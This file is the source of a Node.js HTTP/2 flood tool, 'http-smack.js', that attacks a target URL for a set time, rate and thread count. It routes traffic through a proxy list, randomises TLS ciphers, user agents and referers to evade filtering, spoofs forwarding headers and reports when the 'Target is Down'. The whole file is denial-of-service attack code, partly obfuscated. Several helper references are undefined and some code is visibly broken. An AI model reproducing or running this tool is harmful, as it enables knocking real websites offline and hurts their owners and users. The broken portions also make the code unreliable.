const net = require('net'),
  http2 = require('http2'),
  tls = require('tls'),
  cluster = require('cluster'),
  url = require('url'),
  crypto = require('crypto'),
  UserAgent = require('user-agents'),
  fs = require('fs'),
  fakeUA = require('fake-useragent'),
  { HeaderGenerator } = require('header-generator')
process.setMaxListeners(0)
require('events').EventEmitter.defaultMaxListeners = 0
process.on('uncaughtException', function (_0x304956) {})
process.argv.length < 7 &&
  (console.log('Usage: node http-smack.js target time rate thread proxyfile'),
  process.exit())
const headers = {}
function readLines(_0x108e9a) {
  return fs.readFileSync(_0x108e9a, 'utf-8').toString().split(/\r?\n/)
}
function randomIntn(_0xe37107, _0x13ea25) {
  return Math.floor(Math.random() * (_0x13ea25 - _0xe37107) + _0xe37107)
}
function randomElement(_0x1603db) {
  return _0x1603db[_0x26aed3.BcNvV(randomIntn, 0, _0x1603db.length)]
}
function randstr(_0x13749e) {
  var _0x59d361 = ''
  var _0x522ac2 =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.length
  for (var _0xef4150 = 0; _0xef4150 < _0x13749e; _0xef4150++) {
    _0x59d361 +=
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.charAt(
        Math.floor(Math.random() * _0x522ac2)
      )
  }
  return _0x59d361
}
const ip_spoof = () => {
    const _0x4f4fb6 = () => {
      return Math.floor(Math.random() * 255)
    }
    return (
      _0x4f4fb6() + '.' + _0x4f4fb6() + '.' + _0x4f4fb6() + '.' + _0x4f4fb6()
    )
  },
  spoofed = ip_spoof(),
  _0x364b20 = {}
_0x364b20.target = process.argv[2]
_0x364b20.time = ~~process.argv[3]
_0x364b20.Rate = ~~process.argv[4]
_0x364b20.threads = ~~process.argv[5]
_0x364b20.proxyFile = process.argv[6]
const args = _0x364b20,
  _0x3c84b5 = {}
_0x3c84b5.name = 'chrome'
_0x3c84b5.minVersion = 80
_0x3c84b5.maxVersion = 107
_0x3c84b5.httpVersion = '2'
const _0x3eaaac = {}
_0x3eaaac.browsers = [_0x3c84b5]
_0x3eaaac.devices = ['desktop']
_0x3eaaac.operatingSystems = ['windows']
_0x3eaaac.locales = ['en-US', 'en']
let headerGenerator = new HeaderGenerator(_0x3eaaac),
  randomHeaders = headerGenerator.getHeaders()
const sig = [
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
  ],
  cplist = [
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:ECDHE-ECDSA-AES128-SHA:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:ECDHE-ECDSA-AES256-SHA:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:ECDHE-RSA-AES128-SHA:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
  ],
  accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  ],
  lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
  ],
  encoding_header = ['deflate, gzip, br', 'gzip', 'deflate', 'br'],
  control_header = ['no-cache', 'max-age=0'],
  refers = [
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
  ],
  querys = ['', '&', '', '&&', 'and', '=', '+', '?']
const pathts = ['1', '2', '3', '4', '5', '6'],
  uap = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; rv:111.0) Gecko/20100101 Firefox/111.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 OPR/96.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; rv:112.0) Gecko/20100101 Firefox/112.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0',
    'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.34',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.39',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.0.2246 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; rv:102.0) Gecko/20100101 Goanna/6.0 Firefox/102.0 PaleMoon/32.0.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
  ]
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))],
  siga = sig[Math.floor(Math.floor(Math.random() * sig.length))],
  uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))]
var queryz = querys[Math.floor(Math.random() * querys.length)]
var pathts1 = pathts[Math.floor(Math.random() * pathts.length)],
  Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))],
  accept =
    accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))],
  lang =
    lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))],
  encoding =
    encoding_header[
      Math.floor(Math.floor(Math.random() * encoding_header.length))
    ],
  control =
    control_header[
      Math.floor(Math.floor(Math.random() * control_header.length))
    ],
  proxies = readLines(args.proxyFile)
const parsedTarget = url.parse(args.target)
if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork()
  }
} else {
  setInterval(runFlooder)
}
class NetSocket {
  constructor() {}
  ['HTTP'](_0x45e0b7, _0x151604) {
    const _0x36de60 = _0x45e0b7.address.split(':')
    const _0x5c74e7 = _0x36de60[0],
      _0x5132f6 =
        'CONNECT ' +
        _0x45e0b7.address +
        ':443 HTTP/1.1\r\nHost: ' +
        _0x45e0b7.address +
        ':443\r\nConnection: Keep-Alive\r\n\r\n',
      _0x4ca98f = new Buffer.from(_0x5132f6),
      _0xc0385a = {
        host: _0x45e0b7.host,
        port: _0x45e0b7.port,
      }
    const _0x1bdc73 = net.connect(_0xc0385a)
    _0x1bdc73.setTimeout(_0x45e0b7.timeout * 100000)
    _0x1bdc73.setKeepAlive(true, 100000)
    _0x1bdc73.on('connect', () => {
      _0x1bdc73.write(_0x4ca98f)
    })
    _0x1bdc73.on('data', (_0x251bd7) => {
      const _0x2359b7 = _0x251bd7.toString('utf-8'),
        _0x14e7dd = _0x2359b7.includes('HTTP/1.1 429'),
        _0x1aef9e = _0x2359b7.includes('HTTP/1.1 403'),
        _0x1bda35 = _0x2359b7.includes('HTTP/1.1 422'),
        _0x485762 = _0x2359b7.includes('HTTP/1.1 307'),
        _0x3e2dd2 = _0x2359b7.includes('HTTP/1.1 302'),
        _0x33a9a3 = _0x2359b7.includes('HTTP/1.1 301'),
        _0x1258f0 = _0x2359b7.includes('HTTP/1.1 423'),
        _0x21ab1f = _0x2359b7.includes('HTTP/1.1 203'),
        _0x2dd97e = _0x2359b7.includes('HTTP/1.1 202')
      if (_0x14e7dd === true) {
        return (
          _0x1bdc73.destroy(),
          _0x151604(undefined, 'error: invalid response from proxy server')
        )
      }
      if (_0x1aef9e === true) {
        return (
          _0x1bdc73.destroy(),
          _0x151604(undefined, 'error: invalid response from proxy server')
        )
      }
      if (_0x1bda35 === true) {
        return (
          _0x1bdc73.destroy(),
          _0x151604(undefined, 'error: invalid response from proxy server')
        )
      }
      if (_0x485762 === true) {
        return (
          _0x1bdc73.destroy(),
          _0x151604(undefined, 'error: invalid response from proxy server')
        )
      }
      if (_0x3e2dd2 === true) {
        return (
          _0x1bdc73.destroy(),
          _0x151604(undefined, 'error: invalid response from proxy server')
        )
      }
      if (_0x33a9a3 === true) {
        return (
          _0x1bdc73.destroy(),
          _0x151604(undefined, 'error: invalid response from proxy server')
        )
      }
      if (_0x1258f0 === true) {
        return (
          _0x1bdc73.destroy(),
          _0x151604(undefined, 'error: invalid response from proxy server')
        )
      }
      if (_0x21ab1f === true) {
        return (
          _0x1bdc73.destroy(),
          _0x151604(undefined, 'error: invalid response from proxy server')
        )
      }
      if (_0x2dd97e === true) {
        return (
          _0x1bdc73.destroy(),
          _0x151604(undefined, 'error: invalid response from proxy server')
        )
      }
      return _0x151604(_0x1bdc73, undefined)
    })
    _0x1bdc73.on('timeout', () => {
      return (
        _0x1bdc73.destroy(), _0x151604(undefined, 'error: timeout exceeded')
      )
    })
    _0x1bdc73.on('error', (_0x47de3e) => {
      return _0x1bdc73.destroy(), _0x151604(undefined, 'error: ' + _0x47de3e)
    })
  }
}
const Socker = new NetSocket()
headers[':authority'] = parsedTarget.host
headers[':method'] = 'GET'
headers.referer = Ref
headers[':path'] = parsedTarget.path + '?' + randstr(6) + '=' + randstr(12)
headers.origin = parsedTarget.protocol + '//' + parsedTarget.host
headers[':scheme'] = 'https'
headers.accept = accept
headers['accept-encoding'] = encoding
headers['accept-language'] = lang
headers['cache-control'] =
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0'
headers['upgrade-insecure-requests'] = '1'
headers.pragma = 'no-cache'
headers.TE = 'trailers'
headers.Trailer = 'Max-Forwards'
headers['content-type'] = 'text/plain'
headers['user-agent'] = uap1
function runFlooder() {
  const _0x1761cb = randomElement(proxies)
  const _0x61043b = _0x1761cb.split(':')
  const _0x4483d3 = new UserAgent()
  var _0x99cdf9 = _0x4483d3.toString()
  headers['X-Forwarded-For'] = spoofed
  headers['X-Forwarded-Host'] = spoofed
  headers['Real-IP'] = spoofed
  const _0x480a83 = {
    host: _0x61043b[0],
    port: ~~_0x61043b[1],
    address: parsedTarget.host + ':443',
    timeout: 100,
  }
  Socker.HTTP(_0x480a83, (_0x5122b6, _0xf26d83) => {
    if (_0xf26d83) {
      return
    }
    _0x5122b6.setKeepAlive(true, 600000)
    const _0x463f66 = {
        host: parsedTarget.host,
        ecdhCurve: 'prime256v1',
        ciphers: tls.getCiphers().join(':') + cipper,
        secureProtocol: [
          'TLSv1_2_method',
          'TLSv1_3_methd',
          'SSL_OP_NO_SSLv3',
          'SSL_OP_NO_SSLv2',
          'TLS_OP_NO_TLS_1_1',
          'TLS_OP_NO_TLS_1_0',
        ],
        sigals: siga,
        servername: parsedTarget.host,
        challengesToSolve: Infinity,
        resolveWithFullResponse: true,
        maxRedirects: Infinity,
        followAllRedirects: true,
        decodeEmails: false,
        gzip: true,
        servername: parsedTarget.host,
        port: 443,
        secure: true,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2'],
        socket: _0x5122b6,
      },
      _0x10b540 = tls.connect(443, parsedTarget.host, _0x463f66)
    _0x10b540.setKeepAlive(true, 100000)
    const _0x49ef63 = {
      protocol: 'https:',
      settings: _0x408a99,
      maxSessionMemory: 3333,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => _0x10b540,
      socket: _0x5122b6,
    }
    const _0x506e02 = http2.connect(parsedTarget.href, _0x49ef63)
    _0x506e02.settings(_0x533d9d)
    _0x506e02.setMaxListeners(0)
    _0x506e02.on('connect', () => {
      const _0x5af109 = setInterval(() => {
        if (_0x32f6a3.oJLEg('Gwguc', 'VdtNk')) {
          for (
            let _0x46a0d4 = 0;
            _0x32f6a3.eTrFX(_0x46a0d4, args.Rate);
            _0x46a0d4++
          ) {
            const _0x1f8dcf = _0x506e02
              .request(headers)
              .on('response', (_0xcdf11a) => {
                _0x1f8dcf.close()
                _0x1f8dcf.destroy()
                return
              })
            _0x1f8dcf.end()
          }
        } else {
          for (
            let _0x7720a8 = 0;
            _0x32f6a3.eTrFX(_0x7720a8, _0x485fa4.Rate);
            _0x7720a8++
          ) {
            const _0x56c34f = _0x57d6a9
              .request(_0xdab4d)
              .on('response', (_0x1d8b70) => {
                _0x56c34f.close()
                _0x56c34f.destroy()
                return
              })
            _0x56c34f.end()
          }
        }
      }, 1000)
    })
    _0x506e02.on('close', () => {
      _0x506e02.destroy()
      _0x5122b6.destroy()
      return
    })
    _0x506e02.on('error', (_0x30c8cd) => {
      if (_0x32f6a3.psizv('TfYyv', 'TfYyv')) {
        _0x220ee3.log('Target is Down')
      } else {
        _0x506e02.destroy()
        _0x5122b6.destroy()
        return
      }
    })
  })
  ;(function (_0x47460f, _0x339977, _0x1f9c4c) {
    if (_0x339977.statusCode == 200) {
      console.log('Status 200')
    } else {
      if (
        _0x339977.statusCode == 502 ||
        _0x339977.statusCode == 503 ||
        _0x339977.statusCode == 504 ||
        _0x339977.statusCode == 520 ||
        _0x339977.statusCode == 525 ||
        _0x339977.statusCode == 522
      ) {
        console.log('Target is Down')
      }
    }
  })
}
const KillScript = () => process.exit(1)
setTimeout(KillScript, args.time * 1000)
